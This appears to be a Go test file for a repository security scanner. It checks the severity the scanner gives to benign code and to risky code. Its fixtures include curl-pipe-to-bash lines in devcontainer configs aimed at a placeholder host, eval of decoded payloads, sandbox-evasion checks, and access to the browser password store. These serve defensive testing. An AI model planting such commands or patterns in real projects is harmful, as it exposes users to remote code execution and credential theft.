package scan

import (
	"context"
	"strings"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/model"
)

func highestSeverity(findings []model.Finding, id string) (model.Severity, bool) {
	var best model.Severity
	found := false
	for _, f := range findings {
		if f.RuleID != id {
			continue
		}
		if !found || f.Severity.Rank() > best.Rank() {
			best = f.Severity
		}
		found = true
	}
	return best, found
}

func TestCommonBenignCodeStaysBelowHigh(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name  string
		files map[string]string
		rule  string
	}{
		{"javascript function expressions", map[string]string{"lib/router.js": "var proto = module.exports = function(options) {\n  function router(req, res, next) { router.handle(req, res, next); }\n  return router;\n};\nproto.use = function use(fn) { return this; };\n"}, "EXEC-001"},
		{"python parenthesized imports", map[string]string{"app/__init__.py": "from django.apps import (\n    AppConfig,\n    apps,\n)\nfrom .models import (User, Group)\n"}, "IMPORT-001"},
		{"translation catalog with zero-width space", map[string]string{"locale/af/LC_MESSAGES/django.po": "msgid \"slug\"\nmsgstr \"Gee ’n geldige “slak” ​​uit letters\"\n"}, "UNICODE-001"},
		{"translation catalog with right-to-left embedding", map[string]string{"locale/ckb/LC_MESSAGES/django.po": "msgid \"%(num)d year\"\nmsgstr \"‫%(num)d ساڵ\"\n"}, "UNICODE-001"},
		{"pinned MCP server", map[string]string{".mcp.json": `{"mcpServers":{"fs":{"command":"npx","args":["@modelcontextprotocol/server-filesystem@2025.1.14","."]}}}`}, "AGENT-001"},
		{"devcontainer installs dependencies", map[string]string{".devcontainer/devcontainer.json": `{"image":"mcr.microsoft.com/devcontainers/typescript-node:20","postCreateCommand":"npm ci"}`}, "IDE-001"},
		{"python test deserializes its own data", map[string]string{"tests/test_cache.py": "import pickle\n\ndef test_roundtrip():\n    assert pickle.loads(pickle.dumps(1)) == 1\n"}, "UNSERIALIZE-001"},
		{"cli spawns git with fixed arguments", map[string]string{"bin/cli.js": "const { spawnSync } = require('node:child_process');\nspawnSync('git', ['status'], { stdio: 'inherit' });\n"}, "EXEC-002"},
		{"python runs a fixed program", map[string]string{"tools/fmt.py": "import subprocess\nsubprocess.run([\"black\", \".\"], check=True)\n"}, "EXEC-002"},
		{"translation file named for its locale", map[string]string{"src/locales/af.json": "{\"slug\": \"Gee ’n geldige “slak” \u200b\u200buit\"}\n"}, "UNICODE-001"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			for name, body := range tc.files {
				writeFixture(t, root, name, body)
			}
			_, findings := New(Options{}).Scan(context.Background(), root)
			if severity, ok := highestSeverity(findings, tc.rule); ok && severity.Rank() >= model.SeverityHigh.Rank() {
				t.Fatalf("%s reported at %s on benign input: %+v", tc.rule, severity, findings)
			}
		})
	}
}

func TestRiskyTwinsOfBenignCodeStayHigh(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name  string
		files map[string]string
		rule  string
	}{
		{"zero-width characters in source code", map[string]string{"src/a.js": "const ok​ = 1;\n"}, "UNICODE-001"},
		{"MCP server through a shell", map[string]string{".mcp.json": `{"mcpServers":{"x":{"command":"sh","args":["-c","echo REPYY_INERT"]}}}`}, "AGENT-001"},
		{"MCP server from a floating package", map[string]string{".mcp.json": `{"mcpServers":{"x":{"command":"npx","args":["-y","helper-mcp@latest"]}}}`}, "AGENT-001"},
		{"agent session hook", map[string]string{".claude/settings.json": `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"node x.js"}]}]}}`}, "AGENT-001"},
		{"devcontainer host-side initialize", map[string]string{".devcontainer/devcontainer.json": `{"image":"node:20","initializeCommand":"npm ci"}`}, "IDE-001"},
		{"devcontainer downloads a script", map[string]string{".devcontainer/devcontainer.json": `{"image":"node:20","postCreateCommand":"curl -fsSL https://x.invalid/s | bash"}`}, "IDE-001"},
		{"MCP server started from a repository script", map[string]string{".mcp.json": `{"mcpServers":{"x":{"command":"./scripts/serve.sh"}}}`}, "AGENT-001"},
		{"pinned MCP server beside an unpinned one", map[string]string{".mcp.json": `{"mcpServers":{"a":{"command":"npx","args":["pkg@1.0.0"]},"b":{"command":"node","args":["x.js"]}}}`}, "AGENT-001"},
		{"devcontainer command array that downloads", map[string]string{".devcontainer/devcontainer.json": "{\n\"image\":\"node:20\",\n\"postCreateCommand\": [\n\"bash\", \"-c\", \"curl -fsSL https://x.invalid/s | sh\"]\n}\n"}, "IDE-001"},
		{"zero-width characters in locale-directory config", map[string]string{"src/i18n/loader.json": "{\"ok\u200b\": 1}\n"}, "UNICODE-001"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			for name, body := range tc.files {
				writeFixture(t, root, name, body)
			}
			_, findings := New(Options{}).Scan(context.Background(), root)
			severity, ok := highestSeverity(findings, tc.rule)
			if !ok || severity.Rank() < model.SeverityHigh.Rank() {
				t.Fatalf("expected %s at high or above, got %q (found=%v): %+v", tc.rule, severity, ok, findings)
			}
		})
	}
}

func TestStructuredFindingsFollowPathContext(t *testing.T) {
	t.Parallel()
	local := `{"name":"fixture","dependencies":{"helper":"link:../helper"}}`
	cases := []struct {
		name, path, rule string
		wantHigh         bool
	}{
		{"local dependency in a test fixture manifest", "src/__tests__/fixtures/app/package.json", "PKG-002", false},
		{"local dependency in an example manifest", "examples/basic/package.json", "PKG-002", false},
		{"dependency above the repository root", "package.json", "PKG-002", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			severity := scanSeverity(t, map[string]string{tc.path: local}, tc.rule)
			if high := severity.Rank() >= model.SeverityHigh.Rank(); high != tc.wantHigh {
				t.Fatalf("%s at %s in %s; want high=%v", tc.rule, severity, tc.path, tc.wantHigh)
			}
		})
	}
}

func TestDirectoryDependenciesInsideTheRepositoryStayBelowHigh(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name, path, spec string
		wantHigh         bool
	}{
		{"file directory beside the manifest", "package.json", "file:./packages/helper", false},
		{"link to a sibling workspace", "packages/app/package.json", "link:../helper", false},
		{"bare relative directory", "playground/css/package.json", "file:css-proxy-dep", false},
		{"directory that escapes the repository", "packages/app/package.json", "file:../../../outside", true},
		{"absolute directory", "package.json", "file:/opt/helper", true},
		{"home directory", "package.json", "link:~/helper", true},
		{"local tarball", "package.json", "file:./vendor/helper-1.0.0.tgz", true},
		{"git source", "package.json", "git+https://example.invalid/helper.git", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			severity := scanSeverity(t, map[string]string{tc.path: `{"name":"fixture","dependencies":{"helper":"` + tc.spec + `"}}`}, "PKG-002")
			if high := severity.Rank() >= model.SeverityHigh.Rank(); high != tc.wantHigh {
				t.Fatalf("PKG-002 at %s for %s in %s; want high=%v", severity, tc.spec, tc.path, tc.wantHigh)
			}
		})
	}
}

// Capability rules report what code can do. Alone in ordinary source they are medium;
// a threat signal in the same file, or a file that runs automatically, keeps them high.
func TestCapabilityAloneInOrdinarySourceIsMedium(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name  string
		files map[string]string
		rule  string
	}{
		{"function constructor", map[string]string{"src/a.js": "const run = Function('return 1');\n"}, "EXEC-001"},
		{"computed require", map[string]string{"lib/view.js": "var fn = require(mod).__express;\n"}, "IMPORT-001"},
		{"cache deserialization", map[string]string{"app/cache.py": "import pickle\nvalue = pickle.loads(blob)\n"}, "UNSERIALIZE-001"},
		{"command runner", map[string]string{"src/run.js": "const { spawn } = require('child_process');\nspawn(bin, args);\n"}, "EXEC-002"},
		{"cookie helper", map[string]string{"client/cookies.js": "const all = document.cookie.split('; ');\n"}, "EXFIL-002"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			severity := scanSeverity(t, tc.files, tc.rule)
			if severity != model.SeverityMedium {
				t.Fatalf("%s at %s; want medium", tc.rule, severity)
			}
		})
	}
}

func TestCapabilityWithThreatOrAutorunStaysHigh(t *testing.T) {
	t.Parallel()
	obfuscated := "const _0x3f2a=['log'];function _0x1b9c(_0x5e1d){return _0x3f2a[_0x5e1d];}\nwhile(!![]){break;}\n"
	cases := []struct {
		name  string
		files map[string]string
		rule  string
	}{
		{"eval in obfuscator output", map[string]string{"server/helpers/error.js": obfuscated + "eval(x);\n"}, "EXEC-001"},
		{"require in obfuscator output", map[string]string{"server/routes/pay.js": obfuscated + "require(m);\n"}, "IMPORT-001"},
		{"process launch beside an assembled identifier", map[string]string{"src/p.js": "const k = 'ev' + 'al';\nexecSync(cmd);\n"}, "EXEC-002"},
		{"eval of a value decoded earlier in the file", map[string]string{"server/routes/api/auth.js": "const proxyInfo = atob(config.key);\nrouter.post('/login', h);\neval(proxyInfo);\n"}, "EXEC-001"},
		{"require of a looked-up name beside decoding", map[string]string{"payloads/main.js": "const s = Buffer.from(x, 'base64').toString();\nconst m = require(Q(-663, -897));\n"}, "IMPORT-001"},
		{"process launch in a setup script", map[string]string{"setup.py": "import subprocess\nsubprocess.run(cmd)\n"}, "EXEC-002"},
		{"eval in a tool config", map[string]string{"next.config.js": "eval(x);\nmodule.exports = {};\n"}, "EXEC-001"},
		{"process launch in a Cargo build script", map[string]string{"build.rs": "fn main() { std::process::Command::new(c).spawn(); }\n"}, "EXEC-002"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if severity := scanSeverity(t, tc.files, tc.rule); severity.Rank() < model.SeverityHigh.Rank() {
				t.Fatalf("%s at %s; want high or above", tc.rule, severity)
			}
		})
	}
}

func scanSeverity(t *testing.T, files map[string]string, rule string) model.Severity {
	t.Helper()
	root := t.TempDir()
	for name, body := range files {
		writeFixture(t, root, name, body)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	severity, ok := highestSeverity(findings, rule)
	if !ok {
		t.Fatalf("missing %s: %+v", rule, findings)
	}
	return severity
}

// A tag-pinned action is hardening advice for the repository's owner. It does not put
// someone who clones the repository at risk, so it must not reach the default gate.
func TestMutableActionReferenceIsHardeningAdvice(t *testing.T) {
	t.Parallel()
	files := map[string]string{".github/workflows/ci.yml": "jobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n      - uses: pnpm/action-setup@v4\n"}
	if severity := scanSeverity(t, files, "CICD-003"); severity != model.SeverityMedium {
		t.Fatalf("CICD-003 at %s; want medium", severity)
	}
}

func TestCargoPathDependenciesInsideTheRepositoryStayBelowHigh(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name, path, dependency string
		wantHigh               bool
	}{
		{"workspace crate", "Cargo.toml", `grep = { version = "0.4", path = "crates/grep" }`, false},
		{"sibling workspace crate", "crates/cli/Cargo.toml", `matcher = { path = "../matcher" }`, false},
		{"crate above the repository root", "Cargo.toml", `fork = { path = "../fork" }`, true},
		{"absolute crate path", "Cargo.toml", `fork = { path = "/opt/fork" }`, true},
		{"git crate", "Cargo.toml", `remote = { git = "https://fixture.invalid/r.git", path = "crates/r" }`, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			files := map[string]string{tc.path: "[package]\nname = \"fixture\"\n\n[dependencies]\n" + tc.dependency + "\n"}
			severity := scanSeverity(t, files, "RUST-005")
			if high := severity.Rank() >= model.SeverityHigh.Rank(); high != tc.wantHigh {
				t.Fatalf("RUST-005 at %s for %s; want high=%v", severity, tc.dependency, tc.wantHigh)
			}
		})
	}
}

func TestRoutineTextDoesNotTriggerThreatRules(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name  string
		files map[string]string
		rule  string
	}{
		{"form data handling", map[string]string{"lib/form.js": "if (utils.isFormData(data)) { send(toFormData(obj)); }\nconst form = new FormData();\n"}, "EXFIL-002"},
		{"provider-like text inside base64", map[string]string{"docs/a.svg": "<style>@font-face{src:url(data:font/woff2;base64,AAAASK0123456789abcdef0123456789abcdefAAAA)}</style>\n"}, "SECRET-002"},
		{"lower-case provider-like text", map[string]string{"src/ids.js": "const id = 'sk0123456789abcdef0123456789abcdef';\n"}, "SECRET-002"},
		{"emulator name inside base64", map[string]string{"docs/b.svg": "<style>@font-face{src:url(data:font/woff2;base64,AAAAqemuVMwareAAAA)}</style>\n"}, "EVADE-001"},
		{"dependabot label", map[string]string{".github/dependabot.yml": "updates:\n  - package-ecosystem: github-actions\n    labels:\n      - \"github_actions\"\n"}, "EVADE-001"},
		{"cross-compilation target in a workflow", map[string]string{".github/workflows/release.yml": "jobs:\n  build:\n    steps:\n      - run: make\n        env:\n          qemu: i386\n"}, "EVADE-001"},
		{"byte-order mark at the start of a file", map[string]string{"src/main.js": "\ufeffimport msg from './msg.js';\n"}, "UNICODE-001"},
		{"hooks dependency in a package manifest", map[string]string{"package.json": `{"devDependencies":{"hooks":"^2.14.0"},"scripts":{"run":"node x.js"}}`}, "AGENT-001"},
		{"pre-commit job in a workflow", map[string]string{".github/workflows/bump.yml": "jobs:\n  bump:\n    steps:\n      - name: hooks\n        run: pre-commit autoupdate\n"}, "AGENT-001"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			for name, body := range tc.files {
				writeFixture(t, root, name, body)
			}
			_, findings := New(Options{}).Scan(context.Background(), root)
			if severity, ok := highestSeverity(findings, tc.rule); ok && severity.Rank() >= model.SeverityHigh.Rank() {
				t.Fatalf("%s at %s on routine text: %+v", tc.rule, severity, findings)
			}
		})
	}
}

func TestThreatRulesKeepTheirAttackForms(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name  string
		files map[string]string
		rule  string
	}{
		{"provider key standing alone", map[string]string{"config.js": "const key = 'SK" + strings.Repeat("0123456789abcdef", 2) + "';\n"}, "SECRET-002"},
		{"continuous integration check", map[string]string{"src/a.js": "if (process.env.GITHUB_ACTIONS) { process.exit(0); }\n"}, "EVADE-001"},
		{"emulator check", map[string]string{"src/b.js": "if (/QEMU|VMware/.test(cpuModel)) { return; }\n"}, "EVADE-001"},
		{"byte-order mark inside a file", map[string]string{"src/c.js": "const a = 1;\nconst b\ufeff = 2;\n"}, "UNICODE-001"},
		{"browser password store", map[string]string{"src/d.js": "const db = path.join(profile, 'Login Data');\n"}, "EXFIL-002"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			for name, body := range tc.files {
				writeFixture(t, root, name, body)
			}
			_, findings := New(Options{}).Scan(context.Background(), root)
			if !hasRule(findings, tc.rule) {
				t.Fatalf("missing %s: %+v", tc.rule, findings)
			}
		})
	}
}

func TestTestDirectoriesLowerCapabilitiesButNotThreats(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name     string
		files    map[string]string
		rule     string
		wantHigh bool
	}{
		{"deserialization in a tests directory", map[string]string{"tests/httpwrappers/tests.py": "import pickle\nq1 = pickle.loads(pickle.dumps(q, 2))\n"}, "UNSERIALIZE-001", false},
		{"prototype assignment in a test directory", map[string]string{"test/app.render.js": "View.prototype.render = function(options, fn){ fn(); };\n"}, "PROTO-001", false},
		{"loader handoff in a test setup file", map[string]string{"tests/setup.js": "const run = new Function('require', payload);\nrun(require);\n"}, "EXEC-007", true},
		{"decoded execution in a test file", map[string]string{"src/__tests__/boot.test.js": "eval(atob(payload));\n"}, "CHAIN-002", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			severity := scanSeverity(t, tc.files, tc.rule)
			if high := severity.Rank() >= model.SeverityHigh.Rank(); high != tc.wantHigh {
				t.Fatalf("%s at %s; want high=%v", tc.rule, severity, tc.wantHigh)
			}
		})
	}
}

func TestNetworkPrimitivesAreCapabilities(t *testing.T) {
	t.Parallel()
	if severity := scanSeverity(t, map[string]string{"src/client.js": "const socket = new WebSocket(url);\n"}, "EXFIL-001"); severity != model.SeverityMedium {
		t.Fatalf("EXFIL-001 at %s; want medium", severity)
	}
	files := map[string]string{"src/utils.js": "const fn = new Function(body);\ndns.lookup('localhost', cb);\n"}
	if severity := scanSeverity(t, files, "EXEC-001"); severity != model.SeverityMedium {
		t.Fatalf("a network primitive vouched for EXEC-001 at %s; want medium", severity)
	}
}

func TestWeakSignalsDoNotVouchForCapabilities(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name  string
		files map[string]string
		rule  string
	}{
		{"deserialization of decoded cache data", map[string]string{"app/cache.py": "import base64, pickle\nvalue = pickle.loads(base64.b64decode(blob))\n"}, "UNSERIALIZE-001"},
		{"code generation beside a hostname lookup", map[string]string{"src/utils.js": "const host = os.hostname();\nconst fn = new Function(body);\n"}, "EXEC-001"},
		{"prototype assignment beside prototype access", map[string]string{"lib/view.js": "View.prototype.render = function(o, fn){};\nconst p = obj.__proto__;\n"}, "PROTO-001"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if severity := scanSeverity(t, tc.files, tc.rule); severity != model.SeverityMedium {
				t.Fatalf("%s at %s; want medium", tc.rule, severity)
			}
		})
	}
}

func TestNonExecutingThreatSignalsInTestsAreLowered(t *testing.T) {
	t.Parallel()
	files := map[string]string{"tests/unit/http.test.js": "const key = fs.readFileSync(new URL('./key.pem', import.meta.url));\n"}
	root := t.TempDir()
	for name, body := range files {
		writeFixture(t, root, name, body)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	if severity, ok := highestSeverity(findings, "CRED-002"); ok && severity.Rank() >= model.SeverityHigh.Rank() {
		t.Fatalf("CRED-002 at %s in a test file", severity)
	}
}

func TestComprehensiveProfileKeepsCapabilitiesHigh(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	writeFixture(t, root, "src/run.js", "const { spawn } = require('child_process');\nspawn(bin, args);\n")
	_, findings := New(Options{Profile: ProfileComprehensive}).Scan(context.Background(), root)
	if severity, _ := highestSeverity(findings, "EXEC-002"); severity != model.SeverityHigh {
		t.Fatalf("EXEC-002 at %s under the comprehensive profile; want high", severity)
	}
}
